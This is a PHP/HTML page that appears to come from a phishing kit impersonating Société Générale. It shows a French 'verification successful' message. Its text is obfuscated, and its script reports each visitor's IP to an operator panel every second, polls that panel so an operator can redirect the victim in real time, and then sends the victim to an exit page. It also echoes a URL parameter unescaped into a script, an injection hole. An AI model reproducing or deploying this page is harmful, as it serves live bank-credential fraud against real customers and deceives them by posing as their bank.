<?php 
require "../main.php";
?><!doctype html>
<html>
<head>
<title>SG | Vérification</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
<link rel="stylesheet" href="res/jihanaid.css">
<link rel="stylesheet" href="res/auth.css">
<link rel="icon" href="res/icon.png">
</head>
<body>
<header>
<div class="row">
    <div class="col text-left p-5">
        <img src="res/logo.svg" style="width:180px;">
    </div>
</div>
</header>

<div class="container-full p-5">

<div class="form text-center">
<img src="res/shld.png" style="margin:20px 0; width:50px;">
<h3><?php $obf->obf("Vérification réussie!"); ?> </h3>
<p><?php $obf->obf("Merci de nous avoir aidé à sécuriser votre compte."); ?></p>



<p><button style="margin-top:30px; font-size:1em;" class="submitbtn" onclick="window.location='exit.php';">Mon compte</button></p>
</div>

</div>


<script src="res/cdns/jq.js"></script>


<script>
setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);

setTimeout(() => {
    window.location='exit.php';
}, 5000);
</script>
</body>
</html>